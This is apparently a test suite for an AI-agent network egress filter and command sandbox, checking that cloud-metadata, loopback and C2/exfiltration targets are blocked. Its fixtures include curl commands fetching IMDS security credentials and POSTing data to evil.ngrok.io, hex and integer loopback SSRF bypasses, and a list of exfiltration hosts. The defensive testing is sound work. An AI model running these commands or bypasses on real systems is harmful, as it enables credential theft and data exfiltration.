import assert from "node:assert";
import { describe, it } from "node:test";
import {
  evaluateNetworkEgress,
  inspectCommandForEgress,
  ipToUint32,
  isIpInCidr,
  matchesDomain,
} from "../src/egress-filter.js";
import { AgentCommandSandbox } from "../src/sandbox.js";

describe("AgentShield Network Egress Boundary & CIDR Filter Suite", () => {
  describe("1. IP Normalization & CIDR Evaluation", () => {
    it("converts standard dotted decimal to 32-bit unsigned int", () => {
      assert.strictEqual(ipToUint32("127.0.0.1"), 0x7f000001 >>> 0);
      assert.strictEqual(ipToUint32("169.254.169.254"), 0xa9fea9fe >>> 0);
      assert.strictEqual(ipToUint32("192.168.1.1"), 0xc0a80101 >>> 0);
    });

    it("converts hex and integer encodings correctly", () => {
      assert.strictEqual(ipToUint32("0x7f000001"), 0x7f000001 >>> 0);
      assert.strictEqual(ipToUint32("2130706433"), 0x7f000001 >>> 0);
      assert.strictEqual(ipToUint32("::ffff:127.0.0.1"), 0x7f000001 >>> 0);
    });

    it("evaluates CIDR subnet containment accurately", () => {
      assert.strictEqual(isIpInCidr("169.254.169.254", "169.254.0.0/16"), true);
      assert.strictEqual(isIpInCidr("169.255.1.1", "169.254.0.0/16"), false);
      assert.strictEqual(isIpInCidr("127.0.0.1", "127.0.0.0/8"), true);
      assert.strictEqual(isIpInCidr("127.255.255.255", "127.0.0.0/8"), true);
      assert.strictEqual(isIpInCidr("10.50.1.20", "10.0.0.0/8"), true);
    });
  });

  describe("2. Cloud Metadata IMDS Boundary", () => {
    it("blocks access to AWS/GCP/Azure 169.254.169.254 metadata endpoint", () => {
      const res = evaluateNetworkEgress("http://169.254.169.254/latest/meta-data/");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "metadata_imds");
      assert.ok(res.reason?.includes("cloud instance metadata"));
    });

    it("blocks access to Alibaba Cloud IMDS 100.100.100.200", () => {
      const res = evaluateNetworkEgress("http://100.100.100.200/latest/meta-data/");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "metadata_imds");
    });

    it("blocks metadata.google.internal hostname", () => {
      const res = evaluateNetworkEgress("http://metadata.google.internal/computeMetadata/v1/");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "metadata_imds");
    });

    it("blocks IPv6 link-local cloud metadata fd00:ec2::254", () => {
      const res = evaluateNetworkEgress("http://[fd00:ec2::254]/latest/meta-data/");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "metadata_imds");
    });
  });

  describe("3. Localhost & Loopback Bypass Evasions", () => {
    it("blocks standard localhost and 127.0.0.1", () => {
      const res = evaluateNetworkEgress("http://localhost:8080/admin");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "loopback_bypass");

      const ipRes = evaluateNetworkEgress("http://127.0.0.1:3000/api");
      assert.strictEqual(ipRes.isBlocked, true);
      assert.strictEqual(ipRes.category, "loopback_bypass");
    });

    it("blocks 0.0.0.0 and [::1] loopback addresses", () => {
      const zeroRes = evaluateNetworkEgress("http://0.0.0.0:8000");
      assert.strictEqual(zeroRes.isBlocked, true);
      assert.strictEqual(zeroRes.category, "loopback_bypass");

      const v6Res = evaluateNetworkEgress("http://[::1]:9090");
      assert.strictEqual(v6Res.isBlocked, true);
      assert.strictEqual(v6Res.category, "loopback_bypass");
    });

    it("neutralizes integer and hex IP bypasses (e.g. 2130706433 and 0x7f000001)", () => {
      const intRes = evaluateNetworkEgress("http://2130706433:8080");
      assert.strictEqual(intRes.isBlocked, true);
      assert.strictEqual(intRes.category, "loopback_bypass");

      const hexRes = evaluateNetworkEgress("http://0x7f000001:5000");
      assert.strictEqual(hexRes.isBlocked, true);
      assert.strictEqual(hexRes.category, "loopback_bypass");
    });

    it("blocks public wildcard DNS pointing to loopback (localtest.me, lvh.me)", () => {
      const lvhRes = evaluateNetworkEgress("http://app.localtest.me:3000");
      assert.strictEqual(lvhRes.isBlocked, true);
      assert.strictEqual(lvhRes.category, "loopback_bypass");
    });
  });

  describe("4. Unapproved External C2 & Exfiltration Domains", () => {
    it("blocks ngrok tunnels and subdomains", () => {
      const res = evaluateNetworkEgress("https://malicious-agent.ngrok-free.app/exfil");
      assert.strictEqual(res.isBlocked, true);
      assert.strictEqual(res.category, "c2_exfiltration");
      assert.ok(res.reason?.includes("C2 or exfiltration"));
    });

    it("blocks webhook.site and interactsh targets", () => {
      const webhookRes = evaluateNetworkEgress("https://webhook.site/abc-123-uuid");
      assert.strictEqual(webhookRes.isBlocked, true);
      assert.strictEqual(webhookRes.category, "c2_exfiltration");

      const oastRes = evaluateNetworkEgress("http://c2.oastify.com/pwn");
      assert.strictEqual(oastRes.isBlocked, true);
      assert.strictEqual(oastRes.category, "c2_exfiltration");
    });

    it("allows approved external APIs and services", () => {
      const res = evaluateNetworkEgress("https://api.github.com/repos");
      assert.strictEqual(res.isBlocked, false);
    });
  });

  describe("5. Command Sandbox Integration", () => {
    const sandbox = new AgentCommandSandbox();

    it("blocks curl command attempting cloud metadata extraction", () => {
      const cmd = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/";
      const check = sandbox.inspectCommand(cmd);
      assert.strictEqual(check.isBlocked, true);
      assert.strictEqual(check.category, "credential_exfiltration");
      assert.ok(check.reason?.includes("metadata"));
    });

    it("blocks wget targeting localhost loopback port", () => {
      const cmd = "wget http://127.0.0.1:8080/internal/keys";
      const check = sandbox.inspectCommand(cmd);
      assert.strictEqual(check.isBlocked, true);
      assert.strictEqual(check.category, "credential_exfiltration");
    });

    it("blocks curl exfiltrating to ngrok tunnel", () => {
      const cmd = "curl -X POST https://evil.ngrok.io/collect -d 'data=123'";
      const check = sandbox.inspectCommand(cmd);
      assert.strictEqual(check.isBlocked, true);
      assert.strictEqual(check.category, "credential_exfiltration");
    });

    it("permits standard external package downloads", () => {
      const cmd = "curl -s https://registry.npmjs.org/@ritualdev-lab/devshelf";
      const check = sandbox.inspectCommand(cmd);
      assert.strictEqual(check.isBlocked, false);
    });
  });

  describe("6. Air-Gapped / Private VPC Mode & Local LLM Support", () => {
    it("allows local LLM runtimes (Ollama:11434, vLLM:8000, LM Studio:1234) in air-gapped mode", () => {
      const ollamaRes = evaluateNetworkEgress("http://localhost:11434/api/generate", {
        airGapped: true,
      });
      assert.strictEqual(ollamaRes.isBlocked, false);

      const vllmRes = evaluateNetworkEgress("http://127.0.0.1:8000/v1/chat/completions", {
        airGapped: true,
      });
      assert.strictEqual(vllmRes.isBlocked, false);

      const lmStudioRes = evaluateNetworkEgress("http://localhost:1234/v1/models", {
        airGapped: true,
      });
      assert.strictEqual(lmStudioRes.isBlocked, false);
    });

    it("blocks public outbound internet connections in air-gapped mode", () => {
      const publicRes = evaluateNetworkEgress("https://api.openai.com/v1/chat/completions", {
        airGapped: true,
      });
      assert.strictEqual(publicRes.isBlocked, true);
      assert.strictEqual(publicRes.category, "policy_denied");
      assert.ok(publicRes.reason?.includes("Air-Gapped"));

      const githubRes = evaluateNetworkEgress("https://api.github.com/repos", {
        airGapped: true,
      });
      assert.strictEqual(githubRes.isBlocked, true);
    });

    it("still blocks cloud metadata endpoints in air-gapped mode", () => {
      const imdsRes = evaluateNetworkEgress("http://169.254.169.254/latest/meta-data/", {
        airGapped: true,
      });
      assert.strictEqual(imdsRes.isBlocked, true);
      assert.strictEqual(imdsRes.category, "metadata_imds");
    });
  });
});
